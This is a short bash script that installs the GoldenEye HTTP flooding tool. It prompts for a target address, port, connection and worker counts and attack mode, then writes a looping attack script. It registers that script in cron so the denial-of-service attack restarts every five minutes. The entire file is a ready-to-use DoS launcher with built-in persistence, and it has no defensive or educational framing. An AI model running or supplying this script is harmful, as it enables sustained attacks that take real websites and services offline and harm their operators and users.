#!/bin/bash
apt-get update && apt install -y -q wget curl cron git
cd
git clone https://github.com/jseidl/GoldenEye.git
cd GoldenEye


read -p "Enter Full Target Server ip or domain: " address
read -p "Enter Target Server Port: " port
read -p "Enter number of connections per worker: " connections
read -p "Enter number of workers: " workers
read -p "Enter Attack Mode (get, post, random): " mode

cat > script.sh <<EOF
#!/bin/bash

while true; do
    ./goldeneye.py http://$address:$port/ -s $connections -w $workers -m $mode
    sleep 298  # 5 minutes in seconds
done
EOF

chmod +x script.sh


function addtocrontab () {
  local frequency=$1
  local command=$2
  local job="$frequency $command"
  cat <(fgrep -i -v "$command" <(crontab -l)) <(echo "$job") | crontab -
}
addtocrontab "*/5 * * * *" "bash /root/GoldenEye/script.sh"
